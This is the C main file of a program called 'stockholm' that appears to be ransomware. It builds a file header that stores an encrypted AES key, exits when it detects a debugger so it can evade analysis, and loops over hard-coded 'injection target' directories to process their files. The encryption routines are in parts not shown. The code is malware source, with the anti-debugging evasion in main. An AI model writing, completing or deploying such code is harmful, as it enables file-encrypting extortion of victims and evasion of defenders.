#include "stockholm.h"

unsigned char			*g_mapped_data;
uint16_t				g_modes;
fa_t_stockhlm_header	g_stockhlm_header;

void init_stockholm_header()
{
	// Set the file signature
	memcpy(g_stockhlm_header.signature, FA_SIGNATURE, FA_MAGICNBR_LEN);
	// Set the size of the encrypted AES key
	g_stockhlm_header.encrypted_key_len = FA_AES_ENCRYPT_KEY_LEN;
}

int main(int argc, char *argv[])
{
	(void)argc;

	if (pc_is_debugger_attached())
	{
		if (g_modes & FA_VERBOSE)
			printf("Debugger detected. Exiting...\n");
		return 0; // Exit if a debugger is detected
	}

	// const char *process_name = "zsh";
	// if (pc_is_process_running(process_name)) {
	// 	if (g_modes & FA_VERBOSE)
	// 		printf("The process '%s' is running. Exiting...\n", process_name);
	// 	return 0;
	// }

	// Parse the arguments given through the commannd line
	fa_parse_argv(argv);

	// Init the header that will be placed at the top of the file
	init_stockholm_header();

	// Declare the injection target directory paths
	char *target_dir_paths[FA_TARGET_ARRAY_SIZE] = FA_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < FA_TARGET_ARRAY_SIZE; ++i)
		handle_dir(target_dir_paths[i]);
}
